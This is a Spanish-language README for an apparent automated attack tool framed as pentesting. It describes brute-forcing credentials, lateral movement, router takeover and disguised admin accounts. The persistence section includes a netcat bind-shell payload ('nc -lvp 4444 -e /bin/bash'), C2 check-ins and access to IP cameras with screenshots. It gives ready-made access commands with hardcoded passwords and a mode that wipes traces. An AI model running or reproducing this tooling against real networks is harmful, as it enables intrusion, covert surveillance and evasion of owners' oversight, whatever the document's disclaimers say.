# SimplifyWFB - Script Simplificado de Pentesting

## Descripción

SimplifyWFB es una versión simplificada del sistema de pentesting que contiene solo las funciones básicas esenciales. Está diseñado para ejecutar dos modos principales:

1. **🚀 Escaneo Completo (Full Scan)**: Ejecuta todas las fases y mantiene persistencia
2. **🧊 Pentest Frío (Cold Pentest)**: Ejecuta todas las fases pero limpia todos los rastros al final

## Características

### 🎯 Fases Implementadas

#### Fase 1: Reconocimiento Completo
- Descubrimiento de hosts en la red
- Escaneo de puertos y servicios
- Detección de tecnologías
- Mapeo de topología de red

#### Fase 2: Recolección de Credenciales
- Ataques de fuerza bruta
- Prueba de credenciales por defecto
- Sniffing de tráfico de red

#### Fase 3: Movimiento Lateral
- Explotación de credenciales encontradas
- Establecimiento de conexiones laterales
- Compromiso de sistemas adicionales

#### Fase 4: Persistencia y Acceso Remoto
- Creación de usuarios persistentes
- Instalación de backdoors
- Establecimiento de conexiones remotas
- Configuración de apuntadores C2
- **Detección y acceso a cámaras IP**
- **Captura de screenshots de prueba**
- **Acceso y explotación del router**
- **Persistencia de red avanzada**

#### Fase 5: Verificación de Persistencias
- Verificación de usuarios creados
- Verificación de backdoors
- Verificación de conexiones remotas

### 🧊 Modo Pentest Frío

En el modo pentest frío, después de completar todas las fases y verificar las persistencias, el sistema:

1. **Elimina usuarios creados**
2. **Remueve backdoors instalados**
3. **Cierra conexiones remotas**
4. **Limpia archivos temporales**
5. **Genera reporte de limpieza**

## Uso

### Ejecución Básica

```bash
python3 simplifywfb.py
```

### Flujo de Ejecución

1. **Confirmación Legal**: Requiere confirmación de autorización
2. **Auto-configuración**: Detección automática de red y parámetros
3. **Confirmación de Escaneo**: Muestra configuración y confirma inicio
4. **Ejecución de Fases**: Reconocimiento, credenciales, movimiento lateral, persistencia
5. **Reporte Final**: JSON con toda la información de acceso

### Opciones Disponibles

1. **🚀 Escaneo Completo**: Mantiene persistencia para acceso continuo
2. **🧊 Pentest Frío**: Limpia todos los rastros al final
3. **❌ Salir**: Termina el programa

## Reporte JSON

El script genera un único archivo JSON con toda la información:

```json
{
  "metadata": {
    "script_name": "SimplifyWFB",
    "version": "1.0.0",
    "start_time": "2024-01-01T12:00:00",
    "mode": "full|cold",
    "target_network": "192.168.1.0/24",
    "local_ip": "192.168.1.100"
  },
  "phase_1_reconnaissance": {
    "status": "completed",
    "hosts_discovered": [...],
    "services_found": [...],
    "technologies_detected": [...],
    "network_topology": {...}
  },
  "phase_2_credentials": {
    "status": "completed",
    "credentials_found": [...],
    "attack_methods_used": [...]
  },
  "phase_3_lateral_movement": {
    "status": "completed",
    "compromised_systems": [...],
    "lateral_connections": [...]
  },
  "phase_4_persistence": {
    "status": "completed",
    "users_created": [...],
    "backdoors_created": [...],
    "remote_connections": [...],
    "c2_pointers": [...],
    "cameras_accessed": [...],
    "router_access": [...],
    "network_persistence": [...]
  },
  "phase_5_verification": {
    "status": "completed",
    "persistence_checks": [...],
    "access_verification": [...]
  },
  "cleanup": {
    "status": "completed",
    "items_cleaned": [...]
  },
  "summary": {
    "total_hosts": 10,
    "compromised_hosts": 3,
    "persistent_access_points": 5,
    "total_credentials": 8,
    "cameras_accessed": 2,
    "router_access": 1,
    "network_services": 3,
    "execution_time": 120.5,
    "success_rate": 30.0
  }
}
```

## Información de Persistencias

El reporte incluye información detallada sobre todas las persistencias establecidas:

## 🌐 Acceso al Router y Persistencia de Red

El script incluye funcionalidades avanzadas para mantener acceso persistente a la red:

### Acceso al Router
- **Detección automática del gateway**
- **Identificación del tipo de router** (TP-Link, Netgear, Linksys, ASUS, etc.)
- **Fuerza bruta de credenciales del router**
- **Configuración de port forwarding**
- **Creación de usuarios administrativos persistentes**
- **Configuración de VPN server en el router**
- **Backup de configuración del router**

### Persistencia de Red
- **Servidor SSH persistente** (puerto 2222)
- **Servidor VPN OpenVPN** (puerto 1194)
- **Panel web de administración** (puerto 8080)

### Estructura de Datos - Router y Persistencia

```json
{
  "router_access": [
    {
      "gateway": "192.168.1.1",
      "router_type": "tp-link",
      "credentials": {
        "username": "admin",
        "password": "admin"
      },
      "configuration": {
        "port_forwarding": [
          {"external_port": 2222, "internal_port": 22, "protocol": "TCP"},
          {"external_port": 1194, "internal_port": 1194, "protocol": "UDP"}
        ],
        "vpn_server": {
          "enabled": true,
          "protocol": "OpenVPN",
          "port": 1194
        },
        "admin_user_created": true
      }
    }
  ],
  "network_persistence": [
    {
      "service": "ssh",
      "port": 2222,
      "enabled": true,
      "users": [
        {
          "username": "svc_ssh",
          "password": "SSH_P@ssw0rd_2024!",
          "sudo_access": true
        }
      ],
      "access_methods": [
        "ssh svc_ssh@EXTERNAL_IP -p 2222"
      ]
    },
    {
      "service": "openvpn",
      "port": 1194,
      "enabled": true,
      "clients": [
        {
          "config_file": "client.ovpn",
          "external_ip": "YOUR_EXTERNAL_IP"
        }
      ],
      "access_methods": [
        "openvpn --config client.ovpn"
      ]
    },
    {
      "service": "http",
      "port": 8080,
      "enabled": true,
      "panel_url": "http://YOUR_EXTERNAL_IP:8080/admin",
      "credentials": {
        "username": "admin",
        "password": "Web_P@ssw0rd_2024!"
      },
      "features": [
        "remote_access",
        "file_manager",
        "system_monitor",
        "network_tools"
      ]
    }
  ]
}
```

### Métodos de Acceso Remoto

Con la persistencia configurada, puedes acceder remotamente usando:

1. **SSH Persistente**:
   ```bash
   ssh svc_ssh@EXTERNAL_IP -p 2222
   ```

2. **VPN OpenVPN**:
   ```bash
   openvpn --config client.ovpn
   ```

3. **Panel Web**:
   ```bash
   http://admin:Web_P@ssw0rd_2024!@EXTERNAL_IP:8080/admin
   ```

## 📹 Información de Cámaras IP

### Cámaras Accedidas
```json
{
  "host": "192.168.1.100",
  "port": 80,
  "protocol": "http",
  "camera_type": "hikvision",
  "credentials": {
    "username": "admin",
    "password": "admin"
  },
  "camera_info": {
    "model": "DS-2CD2142FWD-I",
    "firmware": "V5.5.82",
    "features": ["ptz", "night_vision", "audio"]
  },
  "screenshots": [
    "camera_screenshots_1640995200/192.168.1.100_screenshot_1.jpg",
    "camera_screenshots_1640995200/192.168.1.100_screenshot_2.jpg"
  ],
  "access_urls": {
    "web_interface": [
      "http://admin:admin@192.168.1.100:80/",
      "http://admin:admin@192.168.1.100:80/index.html"
    ],
    "streaming": [
      "http://admin:admin@192.168.1.100:80/video.mjpg",
      "http://admin:admin@192.168.1.100:80/stream"
    ],
    "snapshots": [
      "http://admin:admin@192.168.1.100:80/snapshot.cgi",
      "http://admin:admin@192.168.1.100:80/image"
    ],
    "control": [
      "http://admin:admin@192.168.1.100:80/cgi-bin/ptz.cgi"
    ]
  }
}
```

### Características de Cámaras
- **Detección automática**: Identifica cámaras IP en puertos comunes
- **Credenciales por defecto**: Prueba credenciales específicas de cámaras
- **Screenshots de prueba**: Captura 2 imágenes como verificación
- **URLs de acceso**: Genera todas las URLs necesarias para acceso posterior
- **Información detallada**: Modelo, firmware, características detectadas

## Información de Persistencias

El reporte incluye información detallada sobre todas las persistencias establecidas:

### Usuarios Creados
```json
{
  "host": "192.168.1.100",
  "username": "svc_192_168_1_100",
  "password": "P@ssw0rd_100!",
  "groups": ["administrators", "remote_desktop_users"],
  "description": "System Maintenance Service"
}
```

### Backdoors
```json
{
  "host": "192.168.1.100",
  "type": "netcat",
  "port": 4444,
  "method": "reverse_shell",
  "payload": "nc -lvp 4444 -e /bin/bash"
}
```

### Conexiones Remotas
```json
{
  "host": "192.168.1.100",
  "type": "ssh",
  "port": 22,
  "username": "svc_192_168_1_100",
  "password": "P@ssw0rd_100!",
  "persistent": true,
  "auto_reconnect": true
}
```

### Apuntadores C2
```json
{
  "host": "192.168.1.100",
  "c2_server": "192.168.1.200",
  "c2_port": 8080,
  "checkin_interval": 300,
  "method": "http_post",
  "encrypted": true
}
```

## Comandos de Acceso

### Acceso SSH
```bash
ssh svc_192_168_1_100@192.168.1.100
# Contraseña: P@ssw0rd_100!
```

### Acceso Netcat
```bash
nc 192.168.1.100 4444
```

### Acceso RDP
```bash
rdesktop -u svc_192_168_1_100 -p 'P@ssw0rd_100!' 192.168.1.100
```

## Requisitos

### Python
- Python 3.6+
- Dependencias: `pip install -r requirements.txt`

### Herramientas del Sistema
- **nmap**: Escaneo de red
- **hydra**: Ataques de fuerza bruta
- **netcat**: Backdoors
- **openssh-client**: Conexiones SSH
- **smbclient**: Conexiones SMB
- **openssl**: Generación de certificados
- **ssh-keygen**: Generación de claves SSH
- **openvpn**: Servidor VPN (opcional)
- **nginx**: Servidor web (opcional)

## Instalación

### Ubuntu/Debian
```bash
# Instalar herramientas del sistema
sudo apt install nmap hydra netcat-openbsd openssh-client smbclient openssl ssh-keygen openvpn nginx

# Instalar dependencias Python
pip install -r requirements.txt

# Ejecutar script
python3 simplifywfb.py
```

### Kali Linux
```bash
# Instalar herramientas del sistema
sudo apt install nmap hydra netcat-traditional openssh-client smbclient openssl ssh-keygen openvpn nginx

# Instalar dependencias Python
pip install -r requirements.txt

# Ejecutar script
python3 simplifywfb.py
```

## ⚠️ ADVERTENCIAS CRÍTICAS

🚨 **ESTE SCRIPT EJECUTA ATAQUES REALES** - NO ES UNA SIMULACIÓN

### Funcionalidades Reales Implementadas:
- ✅ **Ataques de fuerza bruta reales** con Hydra
- ✅ **Explotación real de credenciales** (SSH, FTP, SMB, HTTP)
- ✅ **Creación real de usuarios persistentes** en sistemas
- ✅ **Instalación real de backdoors** con netcat
- ✅ **Acceso remoto real** a sistemas comprometidos
- ✅ **Detección y acceso real a cámaras IP** con screenshots
- ✅ **Auto-configuración inteligente de red** antes del escaneo
- ✅ **Limpieza real** de rastros en modo cold

### ⚠️ ADVERTENCIAS LEGALES:
- **SOLO PARA USO AUTORIZADO Y EDUCATIVO**
- **EL USO NO AUTORIZADO ES ILEGAL**
- **OBTENGA PERMISO ESCRITO ANTES DE USAR**
- **LOS DESARROLLADORES NO SE HACEN RESPONSABLES**
- **PUEDE CAUSAR DAÑOS REALES A SISTEMAS**
- **SIGA LAS LEYES LOCALES E INTERNACIONALES**

### Requisitos de Autorización:
- Solo use en redes que posea o tenga autorización explícita
- Obtenga permiso por escrito antes de realizar pruebas
- Notifique a los propietarios de los sistemas
- Mantenga registros de autorización

## Diferencias con el Script Original

### Simplificaciones
- Solo 2 modos de ejecución (Full Scan y Cold Pentest)
- Un solo archivo de reporte JSON
- Funciones básicas sin características avanzadas
- Sin interfaz web
- Sin gestión de múltiples escaneos

### Funcionalidades Mantenidas
- Las 4 fases principales del pentesting
- Reconocimiento completo de red
- Recolección de credenciales
- Movimiento lateral
- Persistencia y acceso remoto
- Verificación de persistencias
- Limpieza en modo frío

## Casos de Uso

### Escaneo Completo
- Pruebas de penetración autorizadas
- Evaluaciones de seguridad continuas
- Mantenimiento de accesos persistentes

### Pentest Frío
- Pruebas de concepto
- Demostraciones de vulnerabilidades
- Evaluaciones sin dejar rastros
- Análisis de capacidades

## Soporte

Para reportar problemas o solicitar características, consulte la documentación del proyecto principal.
